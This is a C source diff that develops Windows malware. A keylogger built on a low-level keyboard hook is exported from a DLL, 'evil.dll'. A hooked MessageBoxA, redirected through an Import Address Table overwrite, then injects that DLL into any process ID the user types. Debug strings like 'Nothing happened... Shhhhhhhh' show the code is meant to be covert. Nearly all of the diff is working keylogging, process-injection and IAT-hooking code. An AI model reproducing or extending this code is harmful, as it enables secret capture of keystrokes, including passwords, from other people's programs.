@@ -1,8 +1,8 @@
-#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <thread>
 #include <chrono>
+#include "process_injection.h"
 
 
 BOOL runThread = TRUE;
@@ -28,6 +28,7 @@ HOOKPROC ProcessKeystroke(int code, WPARAM wParam, LPARAM lParam){
 }
 
 
+__declspec(dllexport)
 LPTHREAD_START_ROUTINE Keylogger(){
     printf("Keylogging started... tracking keystrokes");
     hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL,  (HOOKPROC) ProcessKeystroke, NULL, 0);
@@ -45,24 +46,15 @@ LPTHREAD_START_ROUTINE Keylogger(){
 int (*originalMsgBox)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA;
 int MyEvilFunction(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
     printf("This is my evil function!\n");
-    HANDLE thread = CreateThread(
-        NULL,
-        0,
-        (LPTHREAD_START_ROUTINE) Keylogger,
-        NULL,
-        0,
-        NULL
-    );
-
-    if (thread) {
-        CloseHandle(thread); // Release the handle; thread keeps running
-    }
+    DWORD PID;
+    printf("Inject another PID to insert Keylogger:");
+    scanf("%d", &PID);
+    HANDLE thread = ProcessInjection( PID, strlen(".\\evil.dll") + 1, ".\\evil.dll", "evil.dll", "Keylogger");
+    
     return originalMsgBox(hWnd, lpText, lpCaption, uType);
 }
 
 void ParsePE(LPCSTR functionToHook ){
-
-
     PVOID imageBase = GetModuleHandle(NULL);
     PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER) imageBase;
     PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)imageBase + dosHeaders->e_lfanew);
@@ -72,7 +64,7 @@ void ParsePE(LPCSTR functionToHook ){
 
     importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importDirectory.VirtualAddress + (DWORD_PTR)imageBase);
 
-    while ( importDescriptor->Name != NULL){
+    while ( importDescriptor->Name != 0){
         LPCSTR dllName = (LPCSTR) (importDescriptor->Name + (DWORD_PTR) imageBase);
         printf("DLL Name: %s\n", dllName);
         // OriginalFirstThunk (also called as Import Lookup Table) contains the supposed addresses of the imported functions.
@@ -87,7 +79,7 @@ void ParsePE(LPCSTR functionToHook ){
         */
         PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA) (importDescriptor->FirstThunk  + (DWORD_PTR) imageBase);
 
-        while (originalFirstThunk->u1.AddressOfData != NULL){
+        while (originalFirstThunk->u1.AddressOfData != 0){
             PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(originalFirstThunk->u1.AddressOfData + (DWORD_PTR)imageBase);
             LPCSTR functionName = (LPCSTR)importByName->Name;
             printf("Function Name: %s\n", functionName);
@@ -98,6 +90,7 @@ void ParsePE(LPCSTR functionToHook ){
                 VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_EXECUTE_READWRITE, &oldProtect);
                 // Overwrite the function pointer in the IAT with the address of our custom function
                 firstThunk->u1.Function = (DWORD_PTR)MyEvilFunction;    
+                printf("IAT Successfully hooked!!! Nothing happened... Shhhhhhhh \n");
                 return;
             }
             
